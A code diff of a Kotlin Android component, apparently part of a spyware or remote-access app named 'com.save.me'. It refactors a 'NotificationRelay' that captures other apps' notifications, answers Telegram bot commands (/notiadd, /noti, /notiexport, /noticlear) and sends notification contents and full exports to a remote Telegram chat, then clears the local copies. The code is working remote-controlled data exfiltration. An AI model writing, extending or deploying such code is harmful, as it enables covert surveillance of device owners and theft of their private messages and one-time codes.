@@ -1,10 +1,8 @@
 package com.save.me
 
 import android.content.Context
-import android.content.pm.ApplicationInfo
 import android.content.pm.PackageManager
 import android.text.format.DateFormat
-import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -15,12 +13,12 @@ import java.util.*
 object NotificationRelay {
     private const val TAG = "NotificationRelay"
     private const val PREFS_NAME = "noti_relay_prefs"
+    private const val NOTI_HISTORY_PREFS = "noti_history_prefs_json"
     private const val KEY_ALLOWED_APPS = "allowed_apps"
     private const val KEY_NOTI_EXPORT = "noti_export"
     private const val MAX_HISTORY = 1000
     private const val BUTTONS_PER_ROW = 2
-    private const val ROW_COUNT = 15
-    private const val APPS_PER_PAGE = BUTTONS_PER_ROW * ROW_COUNT // 30
+    private const val APPS_PER_BATCH = 30
 
     // --- Allowed apps management ---
 
@@ -83,148 +81,127 @@ object NotificationRelay {
             .edit().remove(KEY_NOTI_EXPORT).apply()
     }
 
-    // --- Device admin robust user-app detection using PackageManager only ---
-    private fun isUserApp(pm: PackageManager, ai: ApplicationInfo): Boolean {
-        val isSystemApp = (ai.flags and ApplicationInfo.FLAG_SYSTEM) != 0
-        val isUpdatedSystemApp = (ai.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
-        val hasLauncher = pm.getLaunchIntentForPackage(ai.packageName) != null
-        return ((!isSystemApp) || isUpdatedSystemApp) && hasLauncher && ai.enabled
+    // --- Robust label fetch ---
+    private fun getAppLabel(pm: PackageManager, pkg: String): String {
+        return try {
+            val info = pm.getApplicationInfo(pkg, 0)
+            val label = pm.getApplicationLabel(info)
+            label?.toString() ?: pkg
+        } catch (e: Exception) {
+            pkg
+        }
     }
 
-    private fun getUserInstalledApplications(context: Context): List<ApplicationInfo> {
-        val pm = context.packageManager
-        return pm.getInstalledApplications(PackageManager.GET_META_DATA)
-            .filter { isUserApp(pm, it) }
+    // --- Apps that have posted notifications (history exists) ---
+    private fun getPackagesWithNotificationHistory(context: Context): List<String> {
+        val prefs = context.getSharedPreferences(NOTI_HISTORY_PREFS, Context.MODE_PRIVATE)
+        return prefs.all.keys.filter { it.startsWith("history_") }
+            .map { it.removePrefix("history_") }
+            .distinct()
     }
 
-
-    fun buildAllAppsInlineKeyboard(context: Context, callbackType: String, page: Int = 0): String {
-        val pm = context.packageManager
-        val pkgs = getUserInstalledApplications(context)
-            .sortedBy { pm.getApplicationLabel(it).toString().lowercase(Locale.getDefault()) }
-
-        val totalPages = if (pkgs.isEmpty()) 1 else ((pkgs.size - 1) / APPS_PER_PAGE) + 1
-        val pageFixed = page.coerceIn(0, totalPages - 1)
-        val start = pageFixed * APPS_PER_PAGE
-        val end = minOf(start + APPS_PER_PAGE, pkgs.size)
-        val pagedPkgs = pkgs.subList(start, end)
-
-        val buttons = pagedPkgs.map {
-            val label = pm.getApplicationLabel(it).toString()
-            val pkg = it.packageName
+    // --- Build Inline Keyboard for a batch of apps ---
+    private fun buildAppsInlineKeyboard(pm: PackageManager, pkgs: List<String>, callbackType: String): String {
+        val buttons = pkgs.map { pkg ->
+            val label = getAppLabel(pm, pkg)
             val cbdata = "$callbackType:$pkg"
             """{"text":"$label","callback_data":"$cbdata"}"""
         }
-
-        val rows = buttons.chunked(BUTTONS_PER_ROW).map { "[${it.joinToString(",")}]" }.toMutableList()
-
-        if (totalPages > 1) {
-            val navButtons = mutableListOf<String>()
-            if (pageFixed > 0) {
-                navButtons.add("""{"text":"⬅️ Prev","callback_data":"${callbackType}nav:${pageFixed - 1}"}""")
-            }
-            navButtons.add("""{"text":"Page ${pageFixed + 1}/$totalPages","callback_data":"noop"}""")
-            if (pageFixed < totalPages - 1) {
-                navButtons.add("""{"text":"Next ➡️","callback_data":"${callbackType}nav:${pageFixed + 1}"}""")
-            }
-            rows.add("[${navButtons.joinToString(",")}]")
-        }
+        val rows = buttons.chunked(BUTTONS_PER_ROW).map { "[${it.joinToString(",")}]" }
         return """{"inline_keyboard":[${rows.joinToString(",")}]}"""
     }
 
-    fun buildTrackedAppsInlineKeyboard(context: Context, callbackType: String, page: Int = 0): String {
-        val pm = context.packageManager
-        val allowed = getAllowedApps(context)
-        val pkgs = allowed.mapNotNull {
-            try {
-                pm.getApplicationInfo(it, 0)
-            } catch (e: Exception) { null }
-        }
-            .filter { isUserApp(pm, it) }
-            .sortedBy { pm.getApplicationLabel(it).toString().lowercase(Locale.getDefault()) }
-
-        val totalPages = if (pkgs.isEmpty()) 1 else ((pkgs.size - 1) / APPS_PER_PAGE) + 1
-        val pageFixed = page.coerceIn(0, totalPages - 1)
-        val start = pageFixed * APPS_PER_PAGE
-        val end = minOf(start + APPS_PER_PAGE, pkgs.size)
-        val pagedPkgs = pkgs.subList(start, end)
-
-        val buttons = pagedPkgs.map {
-            val label = pm.getApplicationLabel(it).toString()
-            val pkg = it.packageName
-            val cbdata = "$callbackType:$pkg"
-            """{"text":"$label","callback_data":"$cbdata"}"""
-        }
-
-        val rows = buttons.chunked(BUTTONS_PER_ROW).map { "[${it.joinToString(",")}]" }.toMutableList()
-
-        if (totalPages > 1) {
-            val navButtons = mutableListOf<String>()
-            if (pageFixed > 0) {
-                navButtons.add("""{"text":"⬅️ Prev","callback_data":"${callbackType}nav:${pageFixed - 1}"}""")
-            }
-            navButtons.add("""{"text":"Page ${pageFixed + 1}/$totalPages","callback_data":"noop"}""")
-            if (pageFixed < totalPages - 1) {
-                navButtons.add("""{"text":"Next ➡️","callback_data":"${callbackType}nav:${pageFixed + 1}"}""")
-            }
-            rows.add("[${navButtons.joinToString(",")}]")
-        }
-
-        return """{"inline_keyboard":[${rows.joinToString(",")}]}"""
+    // --- Tracked apps (whitelisted) ---
+    private fun getTrackedApps(context: Context): List<String> {
+        return getAllowedApps(context).toList()
     }
 
+    // --- Handlers ---
 
     fun handleNotiAddPick(context: Context, chatId: String, pkg: String) {
         addAllowedApp(context, pkg)
         val pm = context.packageManager
-        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
+        val label = getAppLabel(pm, pkg)
         UploadManager.sendTelegramMessage(chatId, "Added app: $label ($pkg)")
     }
 
     fun handleNotiRemovePick(context: Context, chatId: String, pkg: String) {
         removeAllowedApp(context, pkg)
         val pm = context.packageManager
-        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
+        val label = getAppLabel(pm, pkg)
         UploadManager.sendTelegramMessage(chatId, "Removed app: $label ($pkg)")
     }
 
-    fun handleNotiAdd(context: Context, chatId: String, page: Int = 0) {
+    // /notiadd: show all apps with notifications, send batches sequentially
+    fun handleNotiAdd(context: Context, chatId: String) {
         CoroutineScope(Dispatchers.IO).launch {
-            val keyboard = buildAllAppsInlineKeyboard(context, "notiaddpick", page)
-            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to add for notification relay:", keyboard)
+            val pm = context.packageManager
+            val pkgs = getPackagesWithNotificationHistory(context)
+                .sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
+            if (pkgs.isEmpty()) {
+                UploadManager.sendTelegramMessage(chatId, "No apps have posted notifications yet.")
+                return@launch
+            }
+            pkgs.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
+                val keyboard = buildAppsInlineKeyboard(pm, batch, "notiaddpick")
+                val message = if (idx == 0)
+                    "Select an app to add for notification relay:"
+                else
+                    "More apps to add for notification relay:"
+                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, message, keyboard)
+            }
         }
     }
 
-    fun handleNotiRemove(context: Context, chatId: String, page: Int = 0) {
+    // /notiremove: show all whitelisted apps, send batches sequentially
+    fun handleNotiRemove(context: Context, chatId: String) {
         CoroutineScope(Dispatchers.IO).launch {
-            val keyboard = buildTrackedAppsInlineKeyboard(context, "notiremovepick", page)
-            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to remove from notification relay:", keyboard)
+            val pm = context.packageManager
+            val pkgs = getTrackedApps(context)
+                .sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
+            if (pkgs.isEmpty()) {
+                UploadManager.sendTelegramMessage(chatId, "No apps are being relayed.")
+                return@launch
+            }
+            pkgs.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
+                val keyboard = buildAppsInlineKeyboard(pm, batch, "notiremovepick")
+                val message = if (idx == 0)
+                    "Select an app to remove from notification relay:"
+                else
+                    "More apps to remove from notification relay:"
+                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, message, keyboard)
+            }
         }
     }
 
+    // /noti: show whitelisted apps and their notification count, send batches sequentially
     fun handleNoti(context: Context, chatId: String) {
         val pm = context.packageManager
-        val allowed = getAllowedApps(context)
+        val allowed = getTrackedApps(context)
         if (allowed.isEmpty()) {
             UploadManager.sendTelegramMessage(chatId, "No apps are being relayed. Use /notiadd to add.")
             return
         }
-        val sb = StringBuilder()
-        sb.append("Relaying notifications for:\n")
-        allowed.forEachIndexed { idx, pkg ->
-            val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
-            val notiCount = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg).size
-            sb.append("${idx + 1}. $label ($pkg) $notiCount\n")
-        }
-        CoroutineScope(Dispatchers.IO).launch {
-            val keyboard = buildTrackedAppsInlineKeyboard(context, "notipick")
+        val pkgsSorted = allowed.sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
+        pkgsSorted.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
+            val sb = StringBuilder()
+            if (idx == 0)
+                sb.append("Relaying notifications for:\n")
+            else
+                sb.append("More relayed apps:\n")
+            batch.forEachIndexed { i, pkg ->
+                val label = getAppLabel(pm, pkg)
+                val notiCount = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg).size
+                sb.append("${i + 1}. $label ($pkg) $notiCount\n")
+            }
+            val keyboard = buildAppsInlineKeyboard(pm, batch, "notipick")
             UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, sb.toString(), keyboard)
         }
     }
 
     fun handleNotiPick(context: Context, chatId: String, pkg: String) {
         val pm = context.packageManager
-        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
+        val label = getAppLabel(pm, pkg)
         val notis = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg)
         if (notis.isEmpty()) {
             UploadManager.sendTelegramMessage(chatId, "No notifications for $label.")
@@ -268,15 +245,35 @@ object NotificationRelay {
             UploadManager.sendTelegramMessage(chatId, sb.toString())
             sentAny = true
         }
-        // Clear sent notifications from DB
         NotificationListenerServiceImpl.clearNotificationsForPackage(context, pkg)
     }
 
     fun handleNotiClearPick(context: Context, chatId: String, pkg: String) {
         NotificationListenerServiceImpl.clearNotificationsForPackage(context, pkg)
         val pm = context.packageManager
-        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
+        val label = getAppLabel(pm, pkg)
         UploadManager.sendTelegramMessage(chatId, "Cleared notifications for $label.")
+    }
+
+    // /noticlear: show whitelisted apps, send batches sequentially
+    fun handleNotiClear(context: Context, chatId: String) {
+        CoroutineScope(Dispatchers.IO).launch {
+            val pm = context.packageManager
+            val pkgs = getTrackedApps(context)
+                .sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
+            if (pkgs.isEmpty()) {
+                UploadManager.sendTelegramMessage(chatId, "No apps to clear notifications for.")
+                return@launch
+            }
+            pkgs.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
+                val keyboard = buildAppsInlineKeyboard(pm, batch, "noticlearpick")
+                val message = if (idx == 0)
+                    "Select an app to clear notifications:"
+                else
+                    "More apps to clear notifications:"
+                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, message, keyboard)
+            }
+        }
     }
 
     fun handleNotiExportPick(context: Context, chatId: String, pkg: String) {
@@ -285,7 +282,8 @@ object NotificationRelay {
             UploadManager.sendTelegramMessage(chatId, "No notifications to export for $pkg.")
             return
         }
-        // Deduplicate
+        val pm = context.packageManager
+        val label = getAppLabel(pm, pkg)
         val deduped = mutableListOf<JSONObject>()
         var last: JSONObject? = null
         for (current in notis) {
@@ -298,8 +296,6 @@ object NotificationRelay {
             }
             last = current
         }
-        val pm = context.packageManager
-        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
         val sb = StringBuilder()
         sb.append("Notification export for $label ($pkg):\n\n")
         deduped.forEachIndexed { idx, obj ->
@@ -312,17 +308,24 @@ object NotificationRelay {
         UploadManager.sendTelegramMessage(chatId, sb.toString())
     }
 
-    fun handleNotiClear(context: Context, chatId: String, page: Int = 0) {
+    // /notiexport: show whitelisted apps, send batches sequentially
+    fun handleNotiExport(context: Context, chatId: String) {
         CoroutineScope(Dispatchers.IO).launch {
-            val keyboard = buildTrackedAppsInlineKeyboard(context, "noticlearpick", page)
-            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to clear notifications:", keyboard)
-        }
-    }
-
-    fun handleNotiExport(context: Context, chatId: String, page: Int = 0) {
-        CoroutineScope(Dispatchers.IO).launch {
-            val keyboard = buildTrackedAppsInlineKeyboard(context, "notiexportpick", page)
-            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, "Select an app to export notifications:", keyboard)
+            val pm = context.packageManager
+            val pkgs = getTrackedApps(context)
+                .sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
+            if (pkgs.isEmpty()) {
+                UploadManager.sendTelegramMessage(chatId, "No apps to export notifications for.")
+                return@launch
+            }
+            pkgs.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
+                val keyboard = buildAppsInlineKeyboard(pm, batch, "notiexportpick")
+                val message = if (idx == 0)
+                    "Select an app to export notifications:"
+                else
+                    "More apps to export notifications:"
+                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, message, keyboard)
+            }
         }
     }
 }
